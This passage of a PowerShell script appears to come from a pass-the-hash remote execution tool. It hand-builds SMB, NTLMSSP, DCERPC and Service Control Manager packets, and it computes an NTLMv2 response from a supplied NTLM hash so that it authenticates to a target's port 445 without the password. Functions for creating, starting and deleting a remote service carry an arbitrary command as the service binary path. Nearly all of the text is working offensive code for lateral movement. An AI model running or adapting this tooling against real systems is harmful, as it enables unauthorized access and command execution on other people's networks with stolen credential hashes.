    [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
    [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2
    $packet_NTLMSSP_Negotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_InitialContextTokenID",[Byte[]](0x60)) # the ASN.1 key names are likely not all correct
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength",$packet_ASN_length_1)
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_ThisMechID",[Byte[]](0x06))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_ThisMechLength",[Byte[]](0x06))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_InnerContextTokenID",[Byte[]](0xa0))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength",$packet_ASN_length_2)
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",[Byte[]](0x30))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2",$packet_ASN_length_3)
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechTypesID",[Byte[]](0xa0))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechTypesLength",[Byte[]](0x0e))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechTypesID2",[Byte[]](0x30))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechTypesLength2",[Byte[]](0x0c))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechTypesID3",[Byte[]](0x06))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechTypesLength3",[Byte[]](0x0a))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechTokenID",[Byte[]](0xa2))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MechTokenLength",$packet_ASN_length_4)
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_NTLMSSPID",[Byte[]](0x04))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_NegotiateFlags",$packet_negotiate_flags)
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSP_Negotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_NTLMSSP_Negotiate
}

function Get-PacketNTLMSSPAuth()
{
    param([Byte[]]$packet_NTLM_response)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
    [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
    $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
    [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
    $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
    [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
    $packet_ASN_length_3 = $packet_ASN_length_3[1,0]
    $packet_NTLMSSP_Auth = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_ASNID",[Byte[]](0xa1,0x82))
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_ASNLength",$packet_ASN_length_1)
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_ASNID2",[Byte[]](0x30,0x82))
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_ASNLength2",$packet_ASN_length_2)
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_ASNID3",[Byte[]](0xa2,0x82))
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_ASNLength3",$packet_ASN_length_3)
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_NTLMSSPID",[Byte[]](0x04,0x82))
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSP_Auth.Add("NTLMSSPAuth_NTLMResponse",$packet_NTLM_response)

    return $packet_NTLMSSP_Auth
}

#DCERPC

function Get-PacketDCERPCBind() # mod this one for WMI
{
    param([Byte[]]$packet_named_pipe_UUID)

    $packet_DCERPC_bind = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCERPC_bind.Add("DCERPCBind_Version",[Byte[]](0x05))
    $packet_DCERPC_bind.Add("DCERPCBind_VersionMinor",[Byte[]](0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_PacketType",[Byte[]](0x0b))
    $packet_DCERPC_bind.Add("DCERPCBind_PacketFlags",[Byte[]](0x03))
    $packet_DCERPC_bind.Add("DCERPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_FragLength",[Byte[]](0x48,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_AuthLength",[Byte[]](0x00,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_CallID",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
    $packet_DCERPC_bind.Add("DCERPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
    $packet_DCERPC_bind.Add("DCERPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_NumCtxItems",[Byte[]](0x01))
    $packet_DCERPC_bind.Add("DCERPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_ContextID",[Byte[]](0x00,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_NumTransItems",[Byte[]](0x01))
    $packet_DCERPC_bind.Add("DCERPCBind_Unknown2",[Byte[]](0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_Interface",$packet_named_pipe_UUID)
    $packet_DCERPC_bind.Add("DCERPCBind_InterfaceVer",[Byte[]](0x02,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_DCERPC_bind.Add("DCERPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_DCERPC_bind.Add("DCERPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    return $packet_DCERPC_bind
}

function Get-PacketDCERPCRequest()
{
    param($packet_service_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length)

    $packet_DCERPC_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCERPC_request.Add("DCERPCRequest_Version",[Byte[]](0x05))
    $packet_DCERPC_request.Add("DCERPCRequest_VersionMinor",[Byte[]](0x00))
    $packet_DCERPC_request.Add("DCERPCRequest_PacketType",[Byte[]](0x00))
    $packet_DCERPC_request.Add("DCERPCRequest_PacketFlags",[Byte[]](0x03))
    $packet_DCERPC_request.Add("DCERPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_DCERPC_request.Add("DCERPCRequest_FragLength",$packet_frag_length)
    $packet_DCERPC_request.Add("DCERPCRequest_AuthLength",[Byte[]](0x00,0x00))
    $packet_DCERPC_request.Add("DCERPCRequest_CallID",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCERPC_request.Add("DCERPCRequest_AllocHint",$packet_alloc_hint)
    $packet_DCERPC_request.Add("DCERPCRequest_ContextID",[Byte[]](0x00,0x00))
    $packet_DCERPC_request.Add("DCERPCRequest_Opnum",[Byte[]](0x0f,0x00))

    return $packet_DCERPC_request
}

#SCM

function Get-PacketSCMOpenSCManagerW()
{
    param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
    $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID1 += 0x00,0x00
    $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID2 += 0x00,0x00
    $packet_SCM_OpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_MachineName_ReferentID",$packet_referent_ID1)
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_MachineName_MaxCount",$packet_service_length)
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_MachineName_ActualCount",$packet_service_length)
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_MachineName",$packet_service)
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_Database_ReferentID",$packet_referent_ID2)
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_Unknown",[Byte[]](0xbf,0xbf))
    $packet_SCM_OpenSCManagerW.Add("OpenSCManagerW_AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
    return $packet_SCM_OpenSCManagerW
}

function Get-PacketSCMCreateServiceW()
{
    param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
            [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
    $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID += 0x00,0x00

    $packet_SCM_CreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCM_CreateServiceW.Add("CreateServiceW_ContextHandle",$packet_context_handle)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_ServiceName_MaxCount",$packet_service_length)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_ServiceName_ActualCount",$packet_service_length)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_ServiceName",$packet_service)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_DisplayName_ReferentID",$packet_referent_ID)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_DisplayName_MaxCount",$packet_service_length)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_DisplayName_ActualCount",$packet_service_length)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_DisplayName",$packet_service)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_ServiceStartType",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_BinaryPathName_MaxCount",$packet_command_length)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_BinaryPathName_ActualCount",$packet_command_length)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_BinaryPathName",$packet_command)
    $packet_SCM_CreateServiceW.Add("CreateServiceW_NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_TagID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_DependSize",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCM_CreateServiceW.Add("CreateServiceW_PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SCM_CreateServiceW
}

function Get-PacketSCMStartServiceW()
{
    param([Byte[]]$packet_context_handle)

    $packet_SCM_StartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCM_StartServiceW.Add("StartServiceW_ContextHandle",$packet_context_handle)
    $packet_SCM_StartServiceW.Add("StartServiceW_Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SCM_StartServiceW
}

function Get-PacketSCMDeleteServiceW()
{
    param([Byte[]]$packet_context_handle)

    $packet_SCM_DeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCM_DeleteServiceW.Add("DeleteServiceW_ContextHandle",$packet_context_handle)

    return $packet_SCM_DeleteServiceW
}

function Get-PacketSCMCloseServiceHandle()
{
    param([Byte[]]$packet_context_handle)

    $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCM_CloseServiceW.Add("CloseServiceW_ContextHandle",$packet_context_handle)

    return $packet_SCM_CloseServiceW
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
$SMB_client = New-Object System.Net.Sockets.TCPClient
$SMB_client.Client.ReceiveTimeout = 60000

try
{
    $SMB_client.Connect($Target,"445")
}
catch
{
    Write-Output "$Target did not respond"
}

if($SMB_client.Connected)
{
    $SMB_client_stream = $SMB_client.GetStream()
    $SMB_client_receive = New-Object System.Byte[] 1024
    $SMB_client_stage = 'NegotiateSMB'

    while($SMB_client_stage -ne 'exit')
    {
        
        switch ($SMB_client_stage)
        {

            'NegotiateSMB'
            {          
                $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                {
                    $SMB_version = 'SMB1'
                    $SMB_client_stage = 'NTLMSSPNegotiate'

                    if([System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f')
                    {
                        $SMB_signing = $true
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                    }
                    else
                    {
                        $SMB_signing = $false
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x05,0x82,0x08,0xa0
                    }

                }
                else
                {
                    $SMB_client_stage = 'NegotiateSMB2'

                    if([System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')
                    {
                        $SMB_signing = $true
                        $SMB_session_key_length = 0x00,0x00 # 0x10,0x00 key exchange with rc4
                        $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0 # 0x15,0x82,0x89,0xa0 key exchange with rc4
                    }
                    else
                    {
                        $SMB_signing = $false
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x05,0x80,0x08,0xa0
                    }
                }

            }

            'NegotiateSMB2'
            {
                $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                $SMB2_message_ID = 1
                $packet_SMB2_header = Get-PacketSMB2Header 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID  
                $packet_SMB2_data = Get-PacketSMB2NegotiateProtocolRequest
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                $SMB_client_stage = 'NTLMSSPNegotiate'
            }
                
            'NTLMSSPNegotiate'
            { 
                if($SMB_version -eq 'SMB1')
                {
                    $packet_SMB_header = Get-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes 0x00,0x00

                    if($SMB_signing)
                    {
                        $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                    }

                    $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                    $packet_SMB_data = Get-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                }
                else
                {
                    $SMB2_message_ID += 1
                    $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                    $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                    $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                }

                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                $SMB_client_stage = 'exit'
            }
            
        }

    }

    $SMB_NTLMSSP = [System.BitConverter]::ToString($SMB_client_receive)
    $SMB_NTLMSSP = $SMB_NTLMSSP -replace "-",""
    $SMB_NTLMSSP_index = $SMB_NTLMSSP.IndexOf("4E544C4D53535000")
    $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2
    $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive
    $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive
    $SMB_session_ID = $SMB_client_receive[44..51]
    $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]
    $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
    $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.length - 12)..($SMB_target_details.length - 5)]
    $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.length;$i += 2){$hash.SubString($i,2)}}) -join "-"
    $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $auth_hostname = (Get-ChildItem -path env:computername).Value
    $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
    $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
    $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
    $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
    $auth_domain_length = $auth_domain_length[0,1]
    $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
    $auth_domain_length = $auth_domain_length[0,1]
    $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
    $auth_username_length = $auth_username_length[0,1]
    $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
    $auth_hostname_length = $auth_hostname_length[0,1]
    $auth_domain_offset = 0x40,0x00,0x00,0x00
    $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
    $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
    $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
    $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
    $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
    $HMAC_MD5.key = $NTLM_hash_bytes
    $username_and_target = $username.ToUpper()
    $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
    $username_and_target_bytes += $auth_domain_bytes
    $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
    $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $security_blob_bytes = 0x01,0x01,0x00,0x00,
                            0x00,0x00,0x00,0x00 +
                            $SMB_target_time_bytes +
                            $client_challenge_bytes +
                            0x00,0x00,0x00,0x00 +
                            $SMB_target_details +
                            0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00

    $server_challenge_and_security_blob_bytes = $SMB_NTLM_challenge + $security_blob_bytes
    $HMAC_MD5.key = $NTLMv2_hash
    $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

    if($SMB_signing)
    {
        $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
        $session_key = $session_base_key
        #$random_session_key = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        #[Byte[]]$session_key = $random_session_key.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        #$exported_session_key = ConvertTo-Rc4ByteStream -Key $session_base_key -InputObject $session_key
        $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
        $HMAC_SHA256.key = $session_key
    }

    if($Domain)
    {
        $output_username = $Domain + "\" + $Username
    }
    else
    {
        $output_username = $Username
    }

    $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
    $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
    $NTLMv2_response_length = $NTLMv2_response_length[0,1]
    $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

    $full_security_blob = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                            0x03,0x00,0x00,0x00,
                            0x18,0x00,
                            0x18,0x00 +
                            $auth_LM_offset +
                            $NTLMv2_response_length +
                            $NTLMv2_response_length +
                            $auth_NTLM_offset +
                            $auth_domain_length +
                            $auth_domain_length +
                            $auth_domain_offset +
                            $auth_username_length +
                            $auth_username_length +
                            $auth_username_offset +
                            $auth_hostname_length +
                            $auth_hostname_length +
                            $auth_hostname_offset +
                            $SMB_session_key_length +
                            $SMB_session_key_length +
                            $SMB_session_key_offset +
                            $SMB_negotiate_flags +
                            $auth_domain_bytes +
                            $auth_username_bytes +
                            $auth_hostname_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                            $NTLMv2_response + 
                            $exported_session_key

    if($SMB_version -eq 'SMB1')
    {
        $SMB_user_ID = $SMB_client_receive[32,33]
        $packet_SMB_header = Get-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes $SMB_user_ID

        if($SMB_signing)
        {
            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
        }

        $packet_SMB_header["SMBHeader_UserID"] = $SMB_user_ID
        $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPAuth $full_security_blob
        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
        $packet_SMB_data = Get-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
    }
    else
    {
        $SMB2_message_ID += 1
        $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
        $packet_NTLMSSP_auth = Get-PacketNTLMSSPAuth $full_security_blob
        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
        $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
        $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_auth
        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
